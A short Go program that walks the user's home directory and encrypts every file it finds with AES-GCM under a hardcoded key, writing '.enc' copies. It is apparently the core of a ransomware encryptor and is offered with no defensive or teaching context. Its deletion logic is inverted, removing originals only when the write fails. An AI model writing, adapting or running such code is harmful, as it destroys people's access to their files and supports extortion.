package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

func main() {

	originalkey := "keythatyouwant"

	key := make([]byte, 32)
	copy(key, originalkey)

	directory, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("Error getting home directory:", err)
	}

	// Setup AES Encrption with the key
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("Error creating cipher:", err)
	}

	// Create the GCM
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println("Error creating GCM:", err)
	}

	// Walk the directory
	filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() {
			// Encrypt the file
			encryptfile(path, gcm)
		}
		return nil
	})
}

func encryptfile(file string, gcm cipher.AEAD) {
	// Read the file
	data, err := os.ReadFile(file)
	if err != nil {
		fmt.Println("Error reading file:", err)
	}

	// Create a nonce
	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		fmt.Println("Error creating nonce:", err)
		return
	}

	// Encrypt the file content
	encrypted := gcm.Seal(nonce, nonce, data, nil)

	// Write
	err = os.WriteFile(file+".enc", encrypted, 0666)
	if err != nil {
		os.Remove(file)
		fmt.Println("Error writing file:", err)
		return
	}
}
